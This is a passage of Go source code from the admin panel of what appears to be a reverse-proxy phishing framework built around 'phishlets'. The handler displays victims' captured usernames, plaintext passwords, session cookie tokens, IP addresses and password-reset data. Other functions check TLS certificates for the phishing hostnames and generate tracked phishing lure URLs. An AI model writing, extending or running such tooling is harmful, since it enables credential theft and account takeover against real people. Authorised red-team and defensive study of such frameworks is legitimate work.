		for _, toks := range s.CookieTokens {
			cookieHits += len(toks)
		}
		customPairs := make([]customPair, 0, len(s.Custom))
		hasReset := false
		for k, v := range s.Custom {
			customPairs = append(customPairs, customPair{Key: k, Value: v})
			switch k {
			case "reset_code", "reset_email", "new_password", "reset_flow":
				hasReset = true
			}
		}
		sort.Slice(customPairs, func(i, j int) bool { return customPairs[i].Key < customPairs[j].Key })
		d.Sessions = append(d.Sessions, sessionView{
			ID:         s.Id,
			Phishlet:   s.Phishlet,
			LandingURL: s.LandingURL,
			Username:   s.Username,
			Password:   s.Password,
			HasCreds:   s.Username != "" || s.Password != "",
			CookieHits: cookieHits,
			BodyHits:   len(s.BodyTokens),
			HttpHits:   len(s.HttpTokens),
			RemoteAddr: s.RemoteAddr,
			Created:    formatUnix(s.CreateTime),
			Updated:    formatUnix(s.UpdateTime),
			Dump:       string(dump),
			Custom:     customPairs,
			HasReset:   hasReset,
		})
	}
}

// withCerts probes every enabled phishlet hostname for its TLS certificate.
func (h *Handler) withCerts(d *pageData) {
	enabled := map[string]bool{}
	for _, s := range h.cfg.GetEnabledSites() {
		enabled[s] = true
	}
	for _, p := range d.Phishlets {
		if p.Hostname == "" {
			continue
		}
		cv := certView{Hostname: p.Hostname, Enabled: enabled[p.Name]}
		res, err := h.certLookup(p.Hostname, h.cfg.GetHttpsPort())
		if err != nil {
			cv.Err = shortErr(err)
		} else if res.Err != "" {
			cv.Err = res.Err
		} else {
			cv.Present = true
			cv.Expires = res.Expiry.UTC().Format("2006-01-02 15:04")
			cv.DaysLeft = int(time.Until(res.Expiry).Hours() / 24)
		}
		d.Certs = append(d.Certs, cv)
	}
}

// render executes the named page template into the response, injecting the
// CSRF token so that all forms in the page carry a valid token when mounted
// behind the gorilla/csrf middleware chain.
func (h *Handler) render(w http.ResponseWriter, r *http.Request, page string, d pageData) {
	d.Csrf = csrf.Token(r)
	d.Base = h.base
	if err := h.tpl.ExecuteTemplate(w, page, d); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}

func (h *Handler) fireOnChange() {
	if h.onChange != nil {
		h.onChange()
	}
}

// fireOnChangeAsync invokes the change callback in the background. It is used
// for certificate syncs, which can block for up to a minute (ACME issuance),
// so the admin request is not held open.
func (h *Handler) fireOnChangeAsync() {
	if h.onChange != nil {
		go h.onChange()
	}
}

func (h *Handler) phishletExists(site string) bool {
	for _, n := range h.cfg.GetPhishletNames() {
		if n == site {
			return true
		}
	}
	return false
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}

func formatUnix(sec int64) string {
	if sec <= 0 {
		return "—"
	}
	return time.Unix(sec, 0).UTC().Format("2006-01-02 15:04:05")
}

// generatePhishURL builds a phishing URL for the given phishlet using the
// shared rid scheme. The rid must be present; host, when non-empty, overrides
// the phishlet hostname (used to target a lure with its own hostname); extra
// accepts whitespace- or newline-separated key=value pairs that are merged
// into the encrypted payload. When no host is given, the phishlet's landing
// phish host is used (the host a lure is matched against at request time,
// e.g. the apex for github but the "www" subdomain for facebook/instagram).
func generatePhishURL(cfg *core.Config, phishlet, host, rid, phishPath, extra string) (string, error) {
	hostname := strings.TrimSpace(host)
	if hostname == "" {
		pl, err := cfg.GetPhishlet(phishlet)
		if err != nil {
			return "", fmt.Errorf("phishlet %q not found", phishlet)
		}
		hostname = pl.GetLandingPhishHost()
		if hostname == "" {
			hostname, _ = cfg.GetSiteDomain(phishlet)
		}
		if strings.TrimSpace(hostname) == "" {
			return "", fmt.Errorf("no hostname configured for phishlet %q: set one on the Phishlets page", phishlet)
		}
	}
	rid = strings.TrimSpace(rid)
	if rid == "" {
		return "", fmt.Errorf("the rid (result id) parameter is required")
	}
	if phishPath == "" {
		phishPath = "/"
	}
	if !strings.HasPrefix(phishPath, "/") {
		phishPath = "/" + phishPath
	}

	base := "https://" + hostname + phishPath
	if cfg.PortTolerance() && cfg.GetHttpsPort() != 443 {
		base = "https://" + hostname + fmt.Sprintf(":%d", cfg.GetHttpsPort()) + phishPath
	}
	params := url.Values{}
	params.Add("rid", rid)
	for _, tok := range strings.Fields(extra) {
		kv := strings.SplitN(tok, "=", 2)
		if len(kv) != 2 {
			continue
		}
		params.Add(strings.TrimSpace(kv[0]), strings.TrimSpace(kv[1]))
	}
	return ridlib.CreatePhishUrl(base, &params), nil
}
